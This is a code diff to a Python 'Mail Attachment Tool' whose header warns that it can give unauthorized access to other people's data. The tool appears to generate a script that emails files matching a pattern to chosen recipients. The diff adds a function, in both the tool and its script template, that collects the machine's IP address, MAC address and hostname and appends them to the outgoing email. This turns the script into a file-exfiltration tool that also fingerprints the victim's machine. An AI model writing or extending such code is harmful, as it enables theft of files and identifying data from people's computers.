@@ -1,7 +1,7 @@
 #######################################################################################
 # Mail Attachment Tool
 # Developed by: ugurcomptech
-# License: Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License 
+# License: Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License
 
 # WARNING: This tool can potentially be misused for malicious purposes and may lead to
 # unauthorized access to other people's important data. Use it responsibly and only with
@@ -14,6 +14,20 @@ import os
 import glob
 import yagmail
 import argparse
+import socket
+import uuid
+
+def get_system_info():
+    # Get the IP address
+    ip_address = socket.gethostbyname(socket.gethostname())
+
+    # Get the MAC address
+    mac_address = ':'.join(hex(uuid.getnode())[i:i+2] for i in range(2, 14, 2))
+
+    # Get the computer name
+    computer_name = socket.gethostname()
+
+    return f"IP Address: {ip_address}\nMAC Address: {mac_address}\nComputer Name: {computer_name}"
 
 if __name__ == "__main__":
     # Create an argparse object to handle the arguments
@@ -39,7 +53,20 @@ if __name__ == "__main__":
 import os
 import glob
 import yagmail
-from getpass import getpass
+import socket
+import uuid
+
+def get_system_info():
+    # Get the IP address
+    ip_address = socket.gethostbyname(socket.gethostname())
+
+    # Get the MAC address
+    mac_address = ':'.join(hex(uuid.getnode())[i:i+2] for i in range(2, 14, 2))
+
+    # Get the computer name
+    computer_name = socket.gethostname()
+
+    return f"IP Address: {{ip_address}}\\nMAC Address: {{mac_address}}\\nComputer Name: {{computer_name}}"
 
 def send_email(sender_email, sender_password, receiver_emails, subject, body, attachment_path):
     try:
@@ -74,6 +101,9 @@ if __name__ == "__main__":
     # Define the email subject and body
     subject = "{args.email_subject}"
     body = "{args.email_body}"
+
+    # Append system information to the email body
+    body += "\\n\\nSystem Information:\\n" + get_system_info()
 
     # Complete the email sending process
     for attachment_file in attachment_files:
